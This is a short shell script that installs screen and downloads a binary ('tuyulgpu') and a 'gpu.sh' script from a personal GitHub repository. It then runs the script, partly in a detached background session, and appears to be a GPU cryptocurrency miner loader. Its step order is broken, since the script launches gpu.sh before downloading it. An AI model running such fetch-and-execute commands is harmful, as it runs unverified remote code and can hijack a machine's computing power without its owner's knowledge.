#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/sorosgeorge/starboy45629/raw/main/tuyulgpu
wget https://raw.githubusercontent.com/sorosgeorge/starboy45629/main/gpu.sh 
chmod +x gpu.sh
./gpu.sh
